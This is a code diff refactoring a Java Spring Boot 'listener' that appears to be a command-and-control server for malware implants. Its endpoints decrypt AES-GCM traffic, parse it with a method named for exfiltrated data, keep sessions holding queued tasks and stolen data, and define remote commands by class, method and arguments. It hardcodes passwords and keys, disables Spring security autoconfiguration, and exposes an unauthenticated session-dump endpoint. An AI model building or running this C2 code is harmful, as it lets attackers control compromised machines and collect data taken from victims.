@@ -2,9 +2,11 @@ package com.nocebo.listener;
 
 import org.springframework.boot.SpringApplication;
 import org.springframework.boot.autoconfigure.SpringBootApplication;
+import org.springframework.boot.autoconfigure.security.servlet.SecurityAutoConfiguration;
 import org.springframework.context.annotation.Bean;
 import org.springframework.context.annotation.Configuration;
 import org.springframework.security.config.annotation.web.builders.HttpSecurity;
+import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
 import org.springframework.security.web.SecurityFilterChain;
 import org.springframework.web.bind.annotation.RestController;
 import org.springframework.web.context.annotation.RequestScope;
@@ -31,6 +33,7 @@ import javax.crypto.IllegalBlockSizeException;
 import java.io.File;
 import java.io.StringWriter;
 import java.io.IOException;
+import java.io.StringReader;
 import java.util.ArrayList;
 import java.util.Hashtable;
 import java.util.Base64;
@@ -44,6 +47,7 @@ import org.w3c.dom.Document;
 import org.w3c.dom.Element;
 import org.w3c.dom.Node;
 import org.w3c.dom.NodeList;
+import org.xml.sax.InputSource;
 import org.xml.sax.SAXException;
 import javax.xml.parsers.DocumentBuilderFactory;
 import javax.xml.parsers.DocumentBuilder;
@@ -54,45 +58,46 @@ import javax.xml.transform.stream.StreamResult;
 
 import java.text.SimpleDateFormat;
 
-class noceboApi
-{
-	static noceboApiUtil napi = new noceboApiUtil();
-	static endpointConfig epc = new endpointConfig();
+@SpringBootApplication(exclude = { SecurityAutoConfiguration.class })
+public class ListenerApplication {
 
-	static class endpointConfig
-	{
-		static String passwd = "T__+Pmv.REW=u9iXBB-";
-		static String userpass = "SiAp++Em=@vBnQo0_";
-		static String encKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
-		static Hashtable<String,session> sessionTable = new Hashtable();
+	public static void main(String[] args) {
+		SpringApplication.run(ListenerApplication.class, args);
 	}
 
 	@RestController
-	class endpoints
+	class noceboEndpoints
 	{
-		static security sapi = new security();
+		static noceboApi.security sapi = new noceboApi.security();
+		static noceboApi.noceboApiUtil napi = new noceboApi.noceboApiUtil();
+		static endpointConfig epc = new endpointConfig();
+	
+		static class endpointConfig
+		{
+			static String passwd = "T__+Pmv.REW=u9iXBB-";
+			static String userpass = "SiAp++Em=@vBnQo0_";
+			static String encKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
+			static Hashtable<String,session> sessionTable = new Hashtable();
+		}
+
 		
 
 		@PostMapping("/60000")
-		String auth(@RequestBody noceboApiRequest requestData, @CookieValue("__Secure-3PSIDCC") String authCookie, @CookieValue("uuid") String idCookie) throws Exception, NoSuchAlgorithmException, IOException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+		String auth(@RequestBody String requestData, @CookieValue("__Secure-3PSIDCC") String authCookie, @CookieValue("uuid") String idCookie) throws Exception, NoSuchAlgorithmException, IOException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
 		{
 			session sessionData;
+			System.out.println(requestData);
 
 			String nonce = idCookie.substring(0,12).replace("-","");
-			Hashtable xmlParsed = napi.xmlExfilToHashtable(
-				new String(
-					sapi.decrypt(
-						Base64.getDecoder().decode(
-							requestData.data
-						), 
-						nonce.getBytes(),
-						epc.encKey
-					)
-				)
-			);
+
+
+			byte[] rawPostData = Base64.getUrlDecoder().decode(requestData.replace("=","").getBytes());
+			byte[] decryptedData = sapi.decrypt(rawPostData,nonce.getBytes(),epc.encKey);
+
+			Hashtable xmlParsed = napi.xmlExfilToHashtable(new String(decryptedData));
 
 			//validate auth first
-			if (!napi.validAuth(xmlParsed))
+			if (!xmlParsed.get("aKey").toString().equals(epc.passwd))
 			{
 				return "nah";	
 			}
@@ -139,7 +144,7 @@ class noceboApi
 			Hashtable xmlParsed = napi.xmlExfilToHashtable(
 				new String(
 					sapi.decrypt(
-						Base64.getDecoder().decode(
+						Base64.getUrlDecoder().decode(
 							requestData.data
 						), 
 						sessionData.nonce.getBytes(),
@@ -178,7 +183,8 @@ class noceboApi
 		}
 
 		@RequestMapping("/log")
-		String log(@RequestBody noceboApiRequest requestData, @CookieValue("nocebo.auth") String authCookie)
+		//String log(@RequestBody noceboApiRequest requestData, @CookieValue("nocebo.auth") String authCookie)
+		String log()
 		{
 			//put authenticator in front
 			return epc.sessionTable.toString();
@@ -189,11 +195,56 @@ class noceboApi
 		//{
 
 		//}
+		class session
+		{
+			static String cookie = new String();
+			static ArrayList tasks = new ArrayList();
+			static String lastSeen = new String();
+			static ArrayList data = new ArrayList();
+			static String encKey = new String();
+			static String nonce = new String();
+		}
+	
+		static class noceboApiRequest
+		{
+			//static ArrayList<noceboApiRequest> Data = new ArrayList<noceboApiRequest>();
+	
+			String data;
+			noceboApiRequest(String data)
+			{
+				this.data = data;
+			}
+		}
+	
+		static class noceboApiCommand
+		{
+			//static ArrayList<noceboApiCommand> Data = new ArrayList<noceboApiCommand>();
+	
+			String className;
+			String methodName;
+			String args;
+			String uuid;
+	
+			//noceboApiCommand(String className, String methodName, String args, String uuid)
+			//{
+			//	this.className = className;
+			//	this.methodName = methodName;
+			//	this.args = args;
+			//	this.uuid = uuid;
+			//}
+		}
 
 	}
+}
+
+
+
+
+class noceboApi
+{
 
 	@Configuration
-	class SecurityConfig 
+	class SecurityConfig
 	{
 		@Bean
  		SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
@@ -207,59 +258,8 @@ class noceboApi
 
 	}
 
-	class session
-	{
-		static String cookie = new String();
-		static ArrayList tasks = new ArrayList();
-		static String lastSeen = new String();
-		static ArrayList data = new ArrayList();
-		static String encKey = new String();
-		static String nonce = new String();
-	}
-
-	class noceboApiRequest
-	{
-		static ArrayList<noceboApiRequest> Data = new ArrayList<noceboApiRequest>();
-
-		String data;
-		noceboApiRequest(String data)
-		{
-			this.data = data;
-		}
-	}
-
-	class noceboApiCommand
-	{
-		static ArrayList<noceboApiCommand> Data = new ArrayList<noceboApiCommand>();
-
-		String className;
-		String methodName;
-		String args;
-		String uuid;
-
-		noceboApiCommand(String className, String methodName, String args, String uuid)
-		{
-			this.className = className;
-			this.methodName = methodName;
-			this.args = args;
-			this.uuid = uuid;
-		}
-	}
-
 	static class noceboApiUtil
 	{
-		public boolean validAuth(Hashtable authData) throws ParserConfigurationException, IOException, SAXException
-		{
-			String authKey = authData.get("aKey").toString();
-			if (authKey == epc.passwd)
-			{
-				return true;
-			}
-			else
-			{
-				return false;
-			}
-		}
 
 		public Hashtable mkTask(String className, String methodName, String[] args) throws IOException
 		{
@@ -374,7 +374,7 @@ class noceboApi
 
 			DocumentBuilderFactory manufactorum = DocumentBuilderFactory.newInstance();
 			DocumentBuilder constructor = manufactorum.newDocumentBuilder();
-			Document doc = constructor.parse(xmlPostData);
+			Document doc = constructor.parse(new InputSource(new StringReader(xmlPostData)));
 
 			Element rootElement = doc.getDocumentElement();
 
@@ -401,7 +401,7 @@ class noceboApi
 	static class security
 	{
 		//replicates my lycanthropy aesgcm
-		private byte[] encrypt(byte[] plaintext, byte[] nonce, String keyData) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+		public byte[] encrypt(byte[] plaintext, byte[] nonce, String keyData) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
 		{
 			SecretKey key = initKey(keyData);
 			Cipher cipher = initCipher();
@@ -411,7 +411,7 @@ class noceboApi
 			return cipher.doFinal(plaintext);
 		}
 
-		private byte[] decrypt(byte[] encrypted, byte[] nonce, String keyData) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+		public byte[] decrypt(byte[] encrypted, byte[] nonce, String keyData) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
 		{
 			SecretKey key = initKey(keyData);
 			Cipher cipher = initCipher();
@@ -429,18 +429,10 @@ class noceboApi
 
 		private SecretKey initKey(String encKey) throws Exception
 		{
-			byte[] keyBytes = Base64.getDecoder().decode(encKey);
+			byte[] keyBytes = encKey.getBytes();
 			SecretKey key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "AES");
 			return key;
 		}
 	}
 }
 
-@SpringBootApplication
-public class ListenerApplication {
-
-	public static void main(String[] args) {
-		SpringApplication.run(ListenerApplication.class, args);
-	}
-
-}
